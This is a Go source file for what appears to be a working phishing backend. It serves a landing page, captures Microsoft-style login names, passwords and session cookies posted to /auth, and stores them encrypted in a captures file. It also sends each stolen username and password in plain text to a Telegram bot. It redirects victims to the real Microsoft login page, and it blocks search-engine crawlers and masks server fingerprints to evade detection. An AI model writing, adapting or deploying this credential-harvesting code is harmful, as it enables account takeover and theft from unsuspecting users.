package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
	"time"
)

//go:embed index.html
var landingPage embed.FS

var (
	storageKey     []byte
	telegramToken  string
	telegramChatID string
)

func main() {
	keyB64 := os.Getenv("STORAGE_KEY")
	if keyB64 == "" {
		log.Fatal("STORAGE_KEY env var required (base64-encoded 32-byte AES key). Generate: go run ../payload-generator/keygen.go")
	}
	var err error
	storageKey, err = base64.StdEncoding.DecodeString(keyB64)
	if err != nil || len(storageKey) != 32 {
		log.Fatal("STORAGE_KEY must be base64-encoded 32-byte AES key")
	}

	port := os.Getenv("PORT")
	if port == "" {
		port = "9090"
	}

	telegramToken = os.Getenv("TELEGRAM_BOT_TOKEN")
	telegramChatID = os.Getenv("TELEGRAM_CHAT_ID")

	redirectURL := os.Getenv("REDIRECT_URL")
	if redirectURL == "" {
		redirectURL = "https://login.microsoftonline.com"
	}

	rl := NewRateLimiter()

	mux := http.NewServeMux()
	mux.HandleFunc("POST /auth", rl.Middleware(handleCapture(redirectURL)))
	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("ok"))
	})

	// Serve the landing page (with embedded JS decryptor) at /
	landingHTML, err := landingPage.ReadFile("index.html")
	if err != nil {
		log.Fatalf("FATAL: cannot read embedded index.html: %v", err)
	}
	log.Printf("Landing page loaded: %d bytes", len(landingHTML))
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(landingHTML)
	})

	// Catch-all 404 — avoids Go's default "404 page not found" fingerprint
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		w.Write([]byte("<html><body></body></html>"))
	})

	log.Printf("Capture backend + landing page listening on :%s (redirect: %s)", port, redirectURL)
	handler := http.MaxBytesHandler(blockBots(securityHeaders(mux)), 64<<10)
	log.Fatal(http.ListenAndServe(":"+port, handler))
}

func handleCapture(redirectURL string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if err := r.ParseForm(); err != nil {
			http.Error(w, "bad form", http.StatusBadRequest)
			return
		}

		username := r.FormValue("loginfmt")
		password := r.FormValue("passwd")
		uuid := r.FormValue("uid")
		cookies := r.FormValue("ctx")

		log.Printf("[AUTH] id=%s ip=%s", uuid, r.RemoteAddr)

		data := map[string]interface{}{
			"timestamp":  time.Now().UTC().Format(time.RFC3339),
			"username":   username,
			"password":   password,
			"uuid":       uuid,
			"cookies":    cookies,
			"ip":         r.RemoteAddr,
			"user_agent": r.UserAgent(),
		}
		// Write analytics event to shared JSONL
		campaignID := r.FormValue("cid")
		status := "success"
		if username == "" && password == "" {
			status = "failed"
		}
		brand := r.FormValue("brand")
		if brand == "" {
			brand = "unknown"
		}
		writeEvent(map[string]interface{}{
			"timestamp":   time.Now().UTC().Format(time.RFC3339),
			"campaign_id": campaignID,
			"brand":       brand,
			"username":    username,
			"ip":          r.RemoteAddr,
			"user_agent":  r.UserAgent(),
			"status":      status,
			"source":      "capture",
		})

		// Send Telegram notification on successful captures
		if status == "success" && username != "" {
			go notifyTelegram(campaignID, brand, username, password, r)
		}

		raw, _ := json.Marshal(data)

		encrypted, err := encryptAESGCM(raw, storageKey)
		if err != nil {
			log.Printf("[ERROR] encrypt: %v", err)
			http.Error(w, "internal error", http.StatusInternalServerError)
			return
		}

		// Write encrypted data to stdout (can be piped to file in production)
		fmt.Printf("AUTH: %s\n", base64.StdEncoding.EncodeToString(encrypted))

		http.Redirect(w, r, redirectURL, http.StatusFound)
	}
}

func encryptAESGCM(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func notifyTelegram(campaignID, brand, username, password string, r *http.Request) {
	if telegramToken == "" || telegramChatID == "" {
		return
	}
	captureTime := time.Now().UTC().Format("2006-01-02 15:04:05 MST")
	msg := fmt.Sprintf("🔴 CAPTURE | %s | %s\n"+
		"Username: %s\n"+
		"Password: %s\n"+
		"IP: %s\n"+
		"User-Agent: %s\n"+
		"Time: %s\n"+
		"Campaign: %s",
		brand, username,
		username, password,
		r.RemoteAddr, r.UserAgent(),
		captureTime, campaignID)
	sendTelegramMessage(msg)
}

func sendTelegramMessage(text string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramToken)
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	w.WriteField("chat_id", telegramChatID)
	w.WriteField("text", text)
	w.Close()
	req, _ := http.NewRequest("POST", url, &buf)
	req.Header.Set("Content-Type", w.FormDataContentType())
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[telegram] send error: %v", err)
		return
	}
	resp.Body.Close()
	log.Printf("[telegram] notification sent")
}

func writeEvent(ev map[string]interface{}) {
	raw, err := json.Marshal(ev)
	if err != nil {
		log.Printf("[jsonl] marshal error: %v", err)
		return
	}
	// Writes with 0600 permissions — analytics server must run as same user to decrypt/read
	f, err := os.OpenFile("../data/captures.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Printf("[jsonl] open error: %v", err)
		return
	}
	defer f.Close()
	if _, err := f.Write(append(raw, '\n')); err != nil {
		log.Printf("[jsonl] write error: %v", err)
	}
}

// --- Security middleware ---

func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("Referrer-Policy", "no-referrer")
		next.ServeHTTP(w, r)
	})
}

var botPatterns = []string{
	"Googlebot", "Bingbot", "Baiduspider", "DuckDuckBot",
	"YandexBot", "Slurp", "Facebot", "Twitterbot",
	"PetalBot", "Applebot", "AhrefsBot", "SemrushBot",
	"DotBot", "Screaming Frog", "Bytespider",
}

func blockBots(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ua := r.UserAgent()
		for _, p := range botPatterns {
			if strings.Contains(ua, p) {
				w.WriteHeader(http.StatusNotFound)
				w.Write([]byte("<html><body></body></html>"))
				return
			}
		}
		next.ServeHTTP(w, r)
	})
}
